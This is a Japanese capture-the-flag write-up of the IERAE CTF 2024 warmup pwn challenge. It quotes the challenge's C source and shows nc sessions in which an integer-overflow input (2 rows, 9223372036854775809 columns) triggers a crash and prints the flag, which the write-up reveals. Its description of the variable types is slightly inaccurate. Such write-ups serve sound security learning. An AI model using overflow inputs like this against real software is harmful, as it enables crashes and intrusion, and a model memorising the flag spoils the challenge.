# This is warmup:pwn

Trust me. If this problem is too difficult for you, I don't mind you burying me in the ground!
nc 104.199.135.28 33334

attachment\
[firectf_ierae-ctf-2024-prod-eh2j3_distfiles_this-is-warmup.tar.gz](https://github.com/colza12/ctf_writeup/blob/main/IERAE%20CTF%202024/pwn/This%20is%20warmup/firectf_ierae-ctf-2024-prod-eh2j3_distfiles_this-is-warmup.tar.gz)

Difficulty Level : warmup\
Point : 193\
Solved : 48

# Solution
とりあえず、`nc 104.199.135.28 33334`を実行してみる。
```
$ nc 104.199.135.28 33334
Enter number of rows: 2
Enter number of cols: 2
I made Ichimatsu design for you!
0 1
1 0
```
縦横の数字を入力すると、指定の大きさの市松模様を出力するプログラムとなっているらしい。
配布ファイルに含まれているchal.cを確認する。
```
int main() {
  // If you cause SEGV, then you will get flag
  signal(SIGSEGV, win);
  setbuf(stdout, NULL);
  
  unsigned long long int nrow, ncol;

  printf("Enter number of rows: ");
  scanf("%llu", &nrow);

  printf("Enter number of cols: ");
  scanf("%llu", &ncol);

  if (nrow * ncol < nrow) { // this is integer overflow right?
    puts("Don't hack!");
    exit(1);
  }

  char *matrix = malloc(nrow*ncol);
  if (!matrix) {
    puts("Too large!");
    exit(1);
  }
```
非常に親切に、セグメンテーションフォルトを起こすとフラグが取れることと、整数オーバーフローが起こる場所が記載されている。\
愚直に、大きい値を入力してみるが、フラグは出てこなかった。
```
$ nc 104.199.135.28 33334
Enter number of rows: 2
Enter number of cols: 9999999999999999999999999999999999999999999999999999999999999999
Too large!
```
`ncol`はlong long intと定義されているため、long long intの最大値周辺を攻める方針で、指示通りにオーバーフローさせる。\
long long intの最大値は、9223372036854775807なので、9223372036854775808以上の数字を入力していく。
```
$ nc 104.199.135.28 33334
Enter number of rows: 2
Enter number of cols: 9223372036854775808
Don't hack!

$ nc 104.199.135.28 33334
Enter number of rows: 2
Enter number of cols: 9223372036854775809
Well done!
IERAE{s33?n07_41w4y5_1_cr3a73_d1ff1cu1t_pr0b13m5}
```
さらに大きな数値でも試してみたが、`9223372039999999999`まで大きくなるとプログラムが動かなくなり、さらに大きくすると、`Too large!`と出力されるようになった。
flagが得られた。

`IERAE{s33?n07_41w4y5_1_cr3a73_d1ff1cu1t_pr0b13m5}`
